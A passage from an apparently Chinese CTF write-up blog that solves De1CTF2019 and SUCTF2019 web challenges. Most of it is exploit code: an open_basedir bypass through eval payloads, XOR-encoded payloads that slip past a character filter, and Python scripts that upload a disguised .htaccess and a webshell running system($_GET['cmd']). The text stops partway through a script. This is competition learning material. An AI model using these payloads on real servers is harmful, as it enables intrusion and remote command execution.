<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">targeting a phpinfo</span><br><span class="line"></span><br><span class="line">targeting b &#123;$a()&#125;</span><br><span class="line"></span><br><span class="line">targeting c $&#123;eval($b)&#125;</span><br><span class="line"></span><br><span class="line">launch</span><br></pre></td></tr></table></figure>

<p>看一下disable_function</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"e"</span>&gt;</span>disable_functions<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"v"</span>&gt;</span>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,dl,exec,system,passthru,popen,proc_open,shell_exec,mail,imap_open,imap_mail,getenv,setenv,putenv,apache_setenv,symli</span><br></pre></td></tr></table></figure>

<p>看一下open_basedir</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"e"</span>&gt;</span>open_basedir<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"v"</span>&gt;</span>/app:/sandbox<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"v"</span>&gt;</span>/app:/sandbox<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>应该是去bypass open_basedir去拿flag，之前也有看过这个漏洞，先写个shell,然后传进去bypass的payload就减少了很多麻烦</p>
<p>shell的payload如下</p>
<p>targeting a _GET</p>
<p>targeting b x</p>
<p>targeting c {$aa{$b}}</p>
<p>targeting d ${eval($c)}</p>
<p>最终exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">totp = pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">cookies=&#123;<span class="string">'PHPSESSID'</span>:<span class="string">'dooinkm2slsr2b6ahp4dju9o0s'</span>&#125;</span><br><span class="line"><span class="comment">#targeting a _GET</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#targeting b x</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#targeting c &#123;$aa&#123;$b&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#targeting d $&#123;eval($c)&#125;</span></span><br><span class="line">payload=<span class="string">"launch"</span></span><br><span class="line">url=<span class="string">"http://web72.node1.buuoj.cn/shell.php"</span></span><br><span class="line">true_url=url+<span class="string">'?a='</span>+urllib.quote(payload)+<span class="string">'&amp;totp='</span>+totp.now()+<span class="string">"&amp;x=chdir('js');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(file_get_contents('/flag'));"</span></span><br><span class="line">r=requests.get(true_url,cookies=cookies)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>

<p>这里看其他师傅的wp的做法也挺好，贴一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"chdir"</span>;</span><br><span class="line">$b = <span class="string">"js"</span>;</span><br><span class="line">$c = <span class="string">"$&#123;$a($b)&#125;"</span>; <span class="comment">//chdir('js');</span></span><br><span class="line">$d = <span class="string">"ini_set"</span>;</span><br><span class="line">$e = <span class="string">"open_basedir"</span>;</span><br><span class="line">$f = <span class="string">".."</span>;</span><br><span class="line">$g = <span class="string">"&#123;$d($e,$f)&#125;"</span>; <span class="comment">//ini_set('open_basedir','..');</span></span><br><span class="line">$h = <span class="string">"&#123;$a($f)&#125;"</span>; <span class="comment">//chdir('..');</span></span><br><span class="line">$h1 = <span class="string">"chr"</span>;</span><br><span class="line">$l = <span class="string">"&#123;$h1(47)&#125;"</span>; <span class="comment">//$l = '/'; 不允许直接出现'/'符号</span></span><br><span class="line">$m = <span class="string">"&#123;$d($e,$l)&#125;"</span>; <span class="comment">//ini_set('open_basedir','/');</span></span><br><span class="line">$n = <span class="string">"var_dump"</span>;</span><br><span class="line">$o = <span class="string">"scandir"</span>;</span><br><span class="line">$p = <span class="string">"&#123;$n($o($l))&#125;"</span>; <span class="comment">//var_dump(scandir('/'));</span></span><br></pre></td></tr></table></figure>

<h3 id="9calc"><a href="#9calc" class="headerlink" title="9calc"></a>9calc</h3><p>拟态防御—有机会学习一下</p>
<h3 id="cloudmusic-rev"><a href="#cloudmusic-rev" class="headerlink" title="cloudmusic_rev"></a>cloudmusic_rev</h3><p>webin…不太会..有机会学习一下.</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/08/27/De1CTF2019/" data-id="ckabsu3820010kkvr5jwxesjz" class="article-share-link" data-share="baidu" data-title="De1CTF2019">Share</a>
      

      
        <a href="http://yoursite.com/2019/08/27/De1CTF2019/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-SUCTF2019" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/08/27/SUCTF2019/" class="article-date">
  <time datetime="2019-08-27T11:34:18.000Z" itemprop="datePublished">2019-08-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/27/SUCTF2019/">SUCTF2019</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h3><p>相对其他题来说比较简单的一道题，所用到的文件是<code>.user.ini</code>，所用范围要比.htaccess的范围要广一些，首先上传.user.ini文件</p>
<p><img src="https://s2.ax1x.com/2019/08/21/mNyluV.png" alt="mNyluV.png"></p>
<p>通过auto_prepend_file指定要包含的文件，再上传这个文件</p>
<p><img src="https://s2.ax1x.com/2019/08/21/mN6Jqf.png" alt="mN6Jqf.png"></p>
<p>成功写入木马，访问目录下的index.php，此时index.php已经包含了2.png的一句话代码。</p>
<p><strong>PS：如果了解过这个知识点的话，其实这道题的提示还是很明显的，给了一个空的index.php，目的就是让人去思考这个文件的作用，进而去想到.user.ini。</strong></p>
<h3 id="Easyweb"><a href="#Easyweb" class="headerlink" title="Easyweb"></a>Easyweb</h3><p>题目比较直接，上来就给了代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>题目目的还是很明确的，通过eval调用get_the_flag函数，然后上传文件bypass，最后拿到shell，然后得到flag.</p>
<p>首先需要通过eval去调用get_the_flag函数，（PS:不得不说php的黑科技真的是多…我之前一直以为异或是要加双引号或者单引号的…通过这个题..长知识了)。</p>
<p>因为这道题ban掉了所有数字和字母，当然还有很多符号，如<code>[,&#39;,&quot;</code>等，所以用的也不是常规的异或构造的字符，这里用的是十六进制异或字符的构造，payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%A0%B8%BA%AB^%ff%ff%ff%ff&#125;&#123;%A0&#125;();&amp;%A0&#x3D;get_the_flag</span><br></pre></td></tr></table></figure>

<p>说到这里.，我自己写了一个小工具，虽然有点不稳定(在linux上，windows还是蛮稳定的，还是蛮有实用价值的，链接如下：<a href="https://github.com/lihuaiqiu/XorShell" target="_blank" rel="noopener">https://github.com/lihuaiqiu/XorShell</a></p>
<p>使用截图</p>
<p><img src="https://s2.ax1x.com/2019/08/22/mw7RED.png" alt="mw7RED.png"></p>
<p>这里不需要引号的原因是</p>
<p>php的经典特性<code>Use of undefined constant</code>，（赛后看出题人的解释知道的..涨知识了，这个特性会将代码中没有引号的都自动作为字符串(Ascii码大于0x7F)，所以通过上面的十六进制可以bypass,调用get_the_flag函数，接着来考虑的是bypass如下代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有三次检测，第一次是匹配后缀的ph字符串，第二次是看文件内容中有无<code>&lt;?</code>，第三次是调用exif_imagetype函数看看是不似乎符合这个函数要的图片。</p>
<p>首先看一下符合exif_imagetype的文件格式</p>
<p><img src="https://s2.ax1x.com/2019/08/26/mRRMwt.png" alt="mRRMwt.png"></p>
<p>这里并没有ban掉htaccess，但是把php ban的很严格，所以我们可以上传htaccess来把我们要的格式解析为php，但这里htaccess也要考虑一些东西，首先必须要可以让htaccess文件正确解析，但是还得符合图片的格式，<strong>在htaccess中#可以注释，还有一种就是把该行用\x00开头，这样配置文件也会把该行作为无效行解析</strong>，<strong>既然这样，我们就有两种绕过手段，第一种是使用注释来标记文件头，第二种是文件头以\x00开头的文件</strong>，原作者给的是xbm文件(第一种，使用注释来标记文件头)</p>
<p>参考链接</p>
<p><a href="https://thibaudrobin.github.io/articles/bypass-filter-upload/" target="_blank" rel="noopener">https://thibaudrobin.github.io/articles/bypass-filter-upload/</a></p>
<p>这样我们就可以通过脚本来生成可以绕过上传.htaccess文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">xbmhtaccess=<span class="string">b"""</span></span><br><span class="line"><span class="string">#define width 1</span></span><br><span class="line"><span class="string">#define height 1</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .qiu</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=zenis.qiu"</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">url=<span class="string">"http://3f165c30-20ac-4c51-8d4a-742208486edc.node1.buuoj.cn/?_=$%7B%86%9E%9C%8D%5E%d9%d9%d9%d9%7D%7B%d9%7D();&amp;%d9=get_the_flag"</span></span><br><span class="line"><span class="comment">#upload</span></span><br><span class="line">files=&#123;</span><br><span class="line">	<span class="string">'file'</span>:(<span class="string">'.htaccess'</span>,xbmhtaccess,<span class="string">'image/png'</span>)</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,files=files)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>

<p>这里我写的是base64编码绕过，原作者用的是utf16，也贴一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span><span class="params">()</span>:</span></span><br><span class="line">htaccess = open(<span class="string">'..htaccess'</span>, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">htaccess.write(SIZE_HEADER)</span><br><span class="line">htaccess.write(<span class="string">b'AddType application/x-httpd-php .php16\n'</span>)</span><br><span class="line">htaccess.write(<span class="string">b'php_value zend.multibyte 1\n'</span>)</span><br><span class="line">htaccess.write(<span class="string">b'php_value zend.detect_unicode 1\n'</span>)</span><br><span class="line">htaccess.write(<span class="string">b'php_value display_errors 1\n'</span>)</span><br><span class="line"></span><br><span class="line">htaccess.close()</span><br><span class="line"></span><br><span class="line">generate_htacess()</span><br></pre></td></tr></table></figure>

<p>原作者最终的exp为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">SIZE_HEADER = <span class="string">b"\n\n#define width 1337\n#define height 1337\n\n"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span><span class="params">(filename, script)</span>:</span></span><br><span class="line">phpfile = open(filename, <span class="string">'wb'</span>) </span><br><span class="line"></span><br><span class="line">phpfile.write(script.encode(<span class="string">'utf-16be'</span>))</span><br><span class="line">phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">phpfile.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span><span class="params">()</span>:</span></span><br><span class="line">htaccess = open(<span class="string">'..htaccess'</span>, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">htaccess.write(SIZE_HEADER)</span><br><span class="line">htaccess.write(<span class="string">b'AddType application/x-httpd-php .php16\n'</span>)</span><br><span class="line">htaccess.write(<span class="string">b'php_value zend.multibyte 1\n'</span>)</span><br><span class="line">htaccess.write(<span class="string">b'php_value zend.detect_unicode 1\n'</span>)</span><br><span class="line">htaccess.write(<span class="string">b'php_value display_errors 1\n'</span>)</span><br><span class="line"></span><br><span class="line">htaccess.close()</span><br><span class="line"></span><br><span class="line">generate_htacess()</span><br><span class="line"></span><br><span class="line">generate_php_file(<span class="string">"webshell.php16"</span>, <span class="string">"&lt;?php system($_GET['cmd']); die(); ?&gt;"</span>)</span><br><span class="line">generate_php_file(<span class="string">"scandir.php16"</span>, <span class="string">"&lt;?php echo implode('\n', scandir($_GET['dir'])); die(); ?&gt;"</span>)</span><br><span class="line">generate_php_file(<span class="string">"getfile.php16"</span>, <span class="string">"&lt;?php echo file_get_contents($_GET['file']); die(); ?&gt;"</span>)</span><br><span class="line">generate_php_file(<span class="string">"info.php16"</span>, <span class="string">"&lt;?php phpinfo(); die(); ?&gt;"</span>)</span><br></pre></td></tr></table></figure>

<p>第二种就是以\x00开头的文件了，wbmp就是这样的文件，不过看ico也是，不过试了一下似乎没成功</p>
<p>来看一下wbmp的文件头….我是生成的wbmp文件，和一些师傅的wp的似乎有些不同，不过也可以成功（Orz，因为第三位是宽度，第四位是高度，后面是数据，所以不一样</p>
<p><a href="https://imgchr.com/i/mR7T91" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/26/mR7T91.png" alt="mR7T91.png"></a></p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">"http://de662a31-6d37-4204-a412-1af93fda3ee9.node1.buuoj.cn?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag"</span></span><br><span class="line">htaccess=<span class="string">b"""\x00\x00\x85\x48\x85\x18</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .test</span></span><br><span class="line"><span class="string">php_value auto_append_file  "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/1.test"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">shell=<span class="string">b"GIF89a"</span>+<span class="string">b"aa"</span>+base64.b64encode(<span class="string">b"&lt;?php phpinfo()?&gt;"</span>) <span class="comment">#aa为了满足base64算法凑足八个字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#first_upload ---- to upload .htaccess</span></span><br><span class="line"></span><br><span class="line">files1=&#123;</span><br><span class="line">	<span class="string">'file'</span>:(<span class="string">'.htaccess'</span>,htaccess,<span class="string">'image/jpeg'</span>)</span><br><span class="line">&#125;</span><br><span class="line">r1=requests.post(url=url,files=files1)</span><br><span class="line"><span class="keyword">print</span> r1.text</span><br><span class="line"></span><br><span class="line"><span class="comment">#second_upload ---- to upload .shell</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">files2=&#123;</span><br><span class="line">	<span class="string">'file'</span>:(<span class="string">'1.test'</span>,shell)</span><br><span class="line">&#125;</span><br><span class="line">r1=requests.post(url,files=files2)</span><br><span class="line"><span class="keyword">print</span> r1.text</span><br></pre></td></tr></table></figure>

<p>这里解释一下htaccess的配置信息的意思</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .test</span><br><span class="line">php_value auto_append_file  &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_fd40c7f4125a9b9ff1a4e75d293e3080&#x2F;1.test&quot;</span><br></pre></td></tr></table></figure>

<p>1.将.test后缀的以php进行解析</p>
<p>2.在加载完php文件后去包含base64解码后的1.test</p>
<p>模拟一下配置文件作用于1.test的流程</p>
<p>首先将1.test以php的方式解析，在1.test加载完毕后，再次包含base64解码后的1.test，成功getshell，所以这也就是为什么会出现两次1.test内容的原因，第一次是没有经过base64解密的，第二次是经过解密并且转化为php了的。</p>
<p><a href="https://imgchr.com/i/mROQJJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/26/mROQJJ.png" alt="mROQJJ.png"></a></p>
<h3 id="Pythonginx"><a href="#Pythonginx" class="headerlink" title="Pythonginx"></a>Pythonginx</h3><p>进入题目给出源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></figure>

<p>这个题目进行了多次对host的检测，当时着急坐火车没太看..其实就是我之前看过的blackhat提出的一个unicode安全问题，还是先分析一下代码逻辑</p>
<p>分别用urlparse与urllib对host进行检测，最后把host分开，每个单词先进行idna编码再进行utf-8解码，形成新的host，最后再进行urlparse然后这时的host如果等于suctf.cc那么就会进行urlopen。其实这里的先编码再解码也给的太明显了…..，看这个就可以想到这个unicode安全问题，用脚本跑一下跑出可用的unicode字符，脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse,urlunsplit,urlsplit</span><br><span class="line"><span 